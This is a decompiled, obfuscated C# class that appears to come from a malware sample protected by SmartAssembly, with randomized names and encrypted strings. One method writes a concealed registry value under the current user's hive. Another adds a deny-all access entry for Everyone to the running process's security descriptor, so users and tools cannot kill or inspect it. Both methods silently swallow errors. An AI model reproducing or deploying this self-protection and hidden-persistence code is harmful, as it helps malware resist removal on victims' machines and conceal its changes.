using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace wawLLalyhHSFm;

internal sealed class HnUqtJRtPb
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr gMTOHrrARGoxT, int kueplhHVuwiBXt, [Out] byte[] TlKfbHzxKxXsEP, uint UxTnnpxyKjm, out uint PvcFIjWLEkqEU);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr RzPbvxfPILIPvWDY, int ZdsGPfTNdPB, [In] byte[] GQGhPGgMfWMPpz);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void GAEuuRqStRLwXfQ(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107401913)));
			registryKey.SetValue(ufSaqXYLSvVxK.hcAHXMuOvto(getString_0(107401808)), getString_0(107404289));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor EdAQdoESekwlXpY(IntPtr intptr_0)
	{
		byte[] tlKfbHzxKxXsEP = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, tlKfbHzxKxXsEP, 0u, out var PvcFIjWLEkqEU);
		if ((long)PvcFIjWLEkqEU > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, tlKfbHzxKxXsEP = new byte[PvcFIjWLEkqEU], PvcFIjWLEkqEU, out PvcFIjWLEkqEU))
		{
			return null;
		}
		return new RawSecurityDescriptor(tlKfbHzxKxXsEP, 0);
	}

	private void APhfJMbpWbEWn(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void lXkRXWsNvjykrj()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = EdAQdoESekwlXpY(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			APhfJMbpWbEWn(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static HnUqtJRtPb()
	{
		Strings.CreateGetStringDelegate(typeof(HnUqtJRtPb));
	}
}
